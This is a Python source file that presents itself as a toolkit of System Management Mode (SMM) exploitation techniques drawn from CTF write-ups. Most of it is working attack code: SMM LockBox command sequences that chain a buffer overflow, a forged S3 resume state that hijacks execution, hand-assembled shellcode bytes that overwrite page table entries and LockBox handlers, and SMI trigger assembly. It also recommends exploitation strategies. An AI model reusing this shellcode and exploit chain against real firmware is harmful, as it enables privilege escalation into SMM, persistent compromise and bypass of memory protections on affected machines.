#!/usr/bin/env python3

"""
SMM (System Management Mode) Exploitation Techniques
Advanced UEFI/EFI exploitation methods extracted from CTF writeups
"""

import struct
import os
import sys
from pathlib import Path

class SMMExploitationTechniques:
    """Advanced SMM exploitation techniques for UEFI/EFI challenges"""
    
    def __init__(self):
        self.smm_techniques = {
            "lockbox_overflow": self.smm_lockbox_buffer_overflow,
            "s3_resume_hijack": self.smm_s3_resume_hijack,
            "smm_communication": self.smm_communication_exploit,
            "pte_overwrite": self.smm_pte_overwrite_bypass
        }
        
        # SMM LockBox GUID
        self.smm_lockbox_guid = struct.pack('<LHHBBBBBBBB', 
                                          0x2a3cfebd, 0x27e8, 0x4d0a,
                                          0x8b, 0x79, 0xd6, 0x88, 0xc2, 0xa3, 0xe1, 0xc0)
        
        # SMM Commands
        self.smm_commands = {
            'SAVE': 0x1,
            'UPDATE': 0x2,
            'RESTORE': 0x3,
            'SET_ATTRIBUTES': 0x4,
            'RESTORE_ALL_IN_PLACE': 0x5
        }
        
        # LockBox Attributes
        self.lockbox_attributes = {
            'RESTORE_IN_PLACE': 0x1,
            'RESTORE_IN_S3_ONLY': 0x2
        }
        
        print("[+] SMM Exploitation Techniques initialized")
    
    def detect_smm_challenge(self, binary_path):
        """Detect if challenge involves SMM exploitation"""
        try:
            with open(binary_path, 'rb') as f:
                content = f.read()
            
            smm_indicators = [
                b"SMM", b"LockBox", b"EFI", b"UEFI", b"GUID",
                b"S3Resume", b"SmmCommunication", b"SMRAM",
                b"0x2a3cfebd", b"trigger_smi", b"out 0xb3"
            ]
            
            detected_indicators = []
            for indicator in smm_indicators:
                if indicator in content:
                    detected_indicators.append(indicator.decode('utf-8', errors='ignore'))
            
            if len(detected_indicators) >= 3:
                print(f"[+] SMM challenge detected with indicators: {detected_indicators}")
                return True
            
            return False
            
        except Exception as e:
            print(f"[-] Error detecting SMM challenge: {e}")
            return False
    
    def smm_lockbox_buffer_overflow(self, target_addr=0xf000000-1, length=1):
        """
        SMM LockBox Buffer Overflow Exploitation
        Exploits size inconsistency between Buffer and SmramBuffer
        """
        print("[+] Crafting SMM LockBox buffer overflow exploit...")
        
        # Create fake GUID
        fake_guid = b'\x11' * 16
        
        # Phase 1: Create initial lockbox with small buffer
        save_command = self.craft_smm_save_command(fake_guid, target_addr, length)
        print(f"[+] Save command: buffer=0x{target_addr:x}, length={length}")
        
        # Phase 2: Set attributes to S3_ONLY
        attr_command = self.craft_smm_set_attributes_command(fake_guid, 
                                                           self.lockbox_attributes['RESTORE_IN_S3_ONLY'])
        print("[+] Setting LockBox attributes to RESTORE_IN_S3_ONLY")
        
        # Phase 3: Update with large offset to trigger reallocation
        # This creates the size inconsistency
        large_offset = 0x1000
        update_payload = b'\x60' * 0x400  # Payload to write
        update_payload += b'SMM_S3' + struct.pack('<Q', 0xffc7673)  # S3 signature
        update_payload += struct.pack('<Q', 0xeacd160 + 0x1000 - 0x8000)  # Stack pointer
        
        update_command = self.craft_smm_update_command(fake_guid, 0xeb68000+0x800, 
                                                     large_offset, len(update_payload))
        print(f"[+] Update command: offset={large_offset}, payload_size={len(update_payload)}")
        
        # Phase 4: Change attributes back to RESTORE_IN_PLACE
        attr_command2 = self.craft_smm_set_attributes_command(fake_guid, 0)
        attr_command3 = self.craft_smm_set_attributes_command(fake_guid, 
                                                            self.lockbox_attributes['RESTORE_IN_PLACE'])
        print("[+] Changing attributes to RESTORE_IN_PLACE")
        
        # Phase 5: Trigger buffer overflow with restore_all_in_place
        restore_command = self.craft_smm_restore_all_command()
        print("[+] Triggering buffer overflow with restore_all_in_place")
        
        exploit_sequence = {
            "save": save_command,
            "set_attr_s3": attr_command,
            "update": update_command,
            "payload": update_payload,
            "set_attr_clear": attr_command2,
            "set_attr_restore": attr_command3,
            "restore_all": restore_command
        }
        
        return exploit_sequence
    
    def smm_s3_resume_hijack(self, shellcode_addr=0x44440000):
        """
        SMM S3 Resume State Hijacking
        Overwrites SmmS3ResumeState structure to control execution
        """
        print("[+] Crafting SMM S3 Resume hijack exploit...")
        
        # SMM_S3_RESUME_STATE structure offsets
        s3_resume_offsets = {
            'signature': 0x0,
            'resume_entry_point': 0x8,
            'stack_base': 0x10,
            'stack_size': 0x18,
            'cr0': 0x20,
            'cr3': 0x28,
            'cr4': 0x30,
            'return_cs': 0x38,
            'return_entry_point': 0x40,
            'return_context1': 0x48,
            'return_context2': 0x50,
            'return_stack_pointer': 0x58,
            'smst': 0x60
        }
        
        # Craft malicious S3 resume state
        s3_payload = bytearray(0x200)
        
        # Set signature
        s3_payload[s3_resume_offsets['signature']:s3_resume_offsets['signature']+8] = \
            struct.pack('<Q', 0x41414141)  # Controlled signature
        
        # Set resume entry point to our shellcode
        s3_payload[s3_resume_offsets['resume_entry_point']:s3_resume_offsets['resume_entry_point']+8] = \
            struct.pack('<Q', 0x000000000eace150)  # Our controlled entry point
        
        # Build ROP/shellcode at controlled location
        shellcode = self.build_smm_shellcode()
        
        exploit_data = {
            "s3_resume_payload": bytes(s3_payload),
            "shellcode": shellcode,
            "target_addr": shellcode_addr,
            "entry_point": 0x000000000eace150
        }
        
        return exploit_data
    
    def build_smm_shellcode(self):
        """Build SMM shellcode for privilege escalation and PTE manipulation"""
        print("[+] Building SMM shellcode...")
        
        # Shellcode to:
        # 1. Overwrite PTE to make memory accessible
        # 2. Overwrite LockBox handlers
        # 3. Return to original resume routine
        
        shellcode_instructions = [
            # Save rax
            0x50,  # push rax
            
            # Make memory at 0x44440000 accessible by overwriting PTE
            # mov rax, 0x8000000044440067
            0x48, 0xb8, 0x67, 0x40, 0x44, 0x44, 0x00, 0x00, 0x00, 0x80,
            # mov qword ptr [0x000000000ff95200], rax  
            0x48, 0x89, 0x04, 0x25, 0x00, 0x52, 0xf9, 0x0f,
            
            # Overwrite LockBox handlers with our payload
            # mov rax, payload_addr
            0x48, 0xb8, 0x48, 0x47, 0xdc, 0x44, 0x00, 0x00, 0x00, 0x44,
            # mov qword ptr [0xffdc743], rax
            0x48, 0x89, 0x04, 0x25, 0x43, 0xc7, 0xfd, 0x0f,
            
            # Continue with more handler overwrites...
            0x48, 0xb8, 0x88, 0x47, 0xdc, 0x44, 0x00, 0x00, 0x00, 0x44,
            0x48, 0x89, 0x04, 0x25, 0x4b, 0xc7, 0xfd, 0x0f,
            
            # Restore rax
            0x58,  # pop rax
            
            # Clear some flags and return to original routine
            0xc6, 0x04, 0x25, 0x78, 0x01, 0xfe, 0x0f, 0x00,  # mov byte ptr [0xffe0178], 0
            0x48, 0xc7, 0x04, 0x25, 0x50, 0xe1, 0xac, 0x0e, 0x00, 0x00, 0x00, 0x00,  # mov qword ptr [0x000000000eace150], 0
            
            # Adjust stack and return
            0x48, 0x83, 0xec, 0x18,  # sub rsp, 0x18
            0x48, 0xc7, 0x04, 0x24, 0x2a, 0x0a, 0xfc, 0x0f, 0x00, 0x00, 0x00, 0x00,  # mov qword ptr [rsp], return_addr
            0xc3  # ret
        ]
        
        return bytes(shellcode_instructions)
    
    def smm_communication_exploit(self, command_buffer_addr=0xeb68000):
        """
        SMM Communication Protocol Exploitation
        Crafts malicious SMM communication headers
        """
        print("[+] Crafting SMM communication exploit...")
        
        # EFI_MM_COMMUNICATE_HEADER structure
        comm_header = bytearray()
        
        # Header GUID (SMM LockBox Communication GUID)
        comm_header.extend(self.smm_lockbox_guid)
        
        # Message length
        message_length = 0x100
        comm_header.extend(struct.pack('<Q', message_length))
        
        # Malicious data payload
        malicious_data = b'A' * 0x100
        comm_header.extend(malicious_data)
        
        # SMI trigger sequence
        smi_trigger = {
            "communication_header": bytes(comm_header),
            "buffer_addr": command_buffer_addr,
            "trigger_ports": [0xb2, 0xb3],  # Standard SMI trigger ports
            "total_size": len(comm_header)
        }
        
        return smi_trigger
    
    def smm_pte_overwrite_bypass(self, target_addr=0x44440000, cr3_base=0xff83000):
        """
        SMM PTE Overwrite for Memory Access Bypass
        Calculates and overwrites page table entries
        """
        print("[+] Calculating PTE overwrite for memory access bypass...")
        
        # Calculate PTE address for target memory
        # PTE address = CR3_base + ((target_addr >> 12) * 8)
        pte_addr = cr3_base + ((target_addr >> 12) * 8)
        
        # Craft PTE value with desired permissions
        # Present (bit 0) + Writable (bit 1) + User (bit 2) + etc.
        pte_value = 0x8000000044440067  # Present, writable, user accessible
        
        pte_exploit = {
            "target_addr": target_addr,
            "pte_addr": pte_addr,
            "pte_value": pte_value,
            "cr3_base": cr3_base,
            "overwrite_code": f"""
            mov rax, 0x{pte_value:x}
            mov qword ptr [0x{pte_addr:x}], rax
            """
        }
        
        print(f"[+] PTE overwrite: addr=0x{pte_addr:x}, value=0x{pte_value:x}")
        return pte_exploit
    
    def craft_smm_save_command(self, guid, buffer_addr, length):
        """Craft SMM LockBox SAVE command"""
        header = struct.pack('<LLQ', 
                           self.smm_commands['SAVE'], 
                           32,  # DataLength
                           0)   # ReturnStatus
        
        command = header + guid + struct.pack('<QQ', buffer_addr, length)
        return command
    
    def craft_smm_update_command(self, guid, buffer_addr, offset, length):
        """Craft SMM LockBox UPDATE command"""
        header = struct.pack('<LLQ', 
                           self.smm_commands['UPDATE'], 
                           40,  # DataLength
                           0)   # ReturnStatus
        
        command = header + guid + struct.pack('<QQQ', offset, buffer_addr, length)
        return command
    
    def craft_smm_set_attributes_command(self, guid, attributes):
        """Craft SMM LockBox SET_ATTRIBUTES command"""
        header = struct.pack('<LLQ', 
                           self.smm_commands['SET_ATTRIBUTES'], 
                           24,  # DataLength
                           0)   # ReturnStatus
        
        command = header + guid + struct.pack('<Q', attributes)
        return command
    
    def craft_smm_restore_all_command(self):
        """Craft SMM LockBox RESTORE_ALL_IN_PLACE command"""
        header = struct.pack('<LLQ', 
                           self.smm_commands['RESTORE_ALL_IN_PLACE'], 
                           0,   # DataLength
                           0)   # ReturnStatus
        
        return header
    
    def generate_smi_trigger_code(self):
        """Generate assembly code to trigger SMI"""
        smi_code = """
        .intel_syntax noprefix;
        xor eax, eax;
        out 0xb3, eax;
        out 0xb2, eax;
        .att_syntax;
        """
        return smi_code
    
    def analyze_smm_vulnerability(self, binary_path):
        """Analyze binary for SMM-specific vulnerabilities"""
        print("[+] Analyzing SMM vulnerabilities...")
        
        vulnerabilities = {
            "lockbox_overflow": False,
            "s3_resume_hijack": False,
            "smm_communication": False,
            "pte_manipulation": False
        }
        
        try:
            with open(binary_path, 'rb') as f:
                content = f.read()
            
            # Check for LockBox overflow patterns
            if b"Buffer" in content and b"SmramBuffer" in content and b"Length" in content:
                vulnerabilities["lockbox_overflow"] = True
                print("[+] Potential LockBox buffer overflow detected")
            
            # Check for S3 resume patterns
            if b"S3Resume" in content or b"SmmS3ResumeState" in content:
                vulnerabilities["s3_resume_hijack"] = True
                print("[+] S3 resume hijacking opportunity detected")
            
            # Check for SMM communication patterns
            if b"SmmCommunication" in content or b"EFI_MM_COMMUNICATE" in content:
                vulnerabilities["smm_communication"] = True
                print("[+] SMM communication exploitation possible")
            
            # Check for PTE manipulation opportunities
            if b"PTE" in content or b"PageTable" in content or b"CR3" in content:
                vulnerabilities["pte_manipulation"] = True
                print("[+] PTE manipulation opportunity detected")
            
        except Exception as e:
            print(f"[-] Error analyzing SMM vulnerabilities: {e}")
        
        return vulnerabilities
    
    def get_smm_exploitation_strategy(self, vulnerabilities):
        """Get recommended SMM exploitation strategy"""
        strategies = []
        
        if vulnerabilities.get("lockbox_overflow"):
            strategies.append({
                "technique": "SMM LockBox Buffer Overflow",
                "priority": "high",
                "description": "Exploit size inconsistency in LockBox Buffer/SmramBuffer",
                "method": "smm_lockbox_buffer_overflow"
            })
        
        if vulnerabilities.get("s3_resume_hijack"):
            strategies.append({
                "technique": "S3 Resume State Hijacking", 
                "priority": "high",
                "description": "Overwrite SmmS3ResumeState to control execution flow",
                "method": "smm_s3_resume_hijack"
            })
        
        if vulnerabilities.get("smm_communication"):
            strategies.append({
                "technique": "SMM Communication Exploitation",
                "priority": "medium", 
                "description": "Exploit SMM communication protocol vulnerabilities",
                "method": "smm_communication_exploit"
            })
        
        if vulnerabilities.get("pte_manipulation"):
            strategies.append({
                "technique": "PTE Overwrite Bypass",
                "priority": "medium",
                "description": "Bypass memory restrictions via PTE manipulation", 
                "method": "smm_pte_overwrite_bypass"
            })
        
        return strategies

def main():
    """Test SMM exploitation techniques"""
    print("SMM Exploitation Techniques Test")
    print("=" * 50)
    
    smm_exploiter = SMMExploitationTechniques()
    
    # Test detection
    test_binary = "test_smm_challenge"
    if smm_exploiter.detect_smm_challenge(test_binary):
        print("[+] SMM challenge detected")
        
        # Analyze vulnerabilities
        vulns = smm_exploiter.analyze_smm_vulnerability(test_binary)
        print(f"[+] Vulnerabilities found: {sum(vulns.values())}")
        
        # Get exploitation strategy
        strategies = smm_exploiter.get_smm_exploitation_strategy(vulns)
        
        print("\n[+] Recommended exploitation strategies:")
        for i, strategy in enumerate(strategies, 1):
            print(f"{i}. {strategy['technique']} (Priority: {strategy['priority']})")
            print(f"   Description: {strategy['description']}")
        
        # Test LockBox overflow exploit
        print("\n[+] Testing LockBox buffer overflow exploit...")
        lockbox_exploit = smm_exploiter.smm_lockbox_buffer_overflow()
        print(f"[+] Generated exploit with {len(lockbox_exploit)} phases")
        
        # Test S3 resume hijack
        print("\n[+] Testing S3 resume hijack exploit...")
        s3_exploit = smm_exploiter.smm_s3_resume_hijack()
        print(f"[+] Generated S3 exploit with shellcode size: {len(s3_exploit['shellcode'])}")
        
        # Test PTE overwrite
        print("\n[+] Testing PTE overwrite bypass...")
        pte_exploit = smm_exploiter.smm_pte_overwrite_bypass()
        print(f"[+] PTE overwrite: 0x{pte_exploit['pte_addr']:x} = 0x{pte_exploit['pte_value']:x}")
    
    print("\n[+] SMM exploitation techniques test completed!")

if __name__ == "__main__":
    main()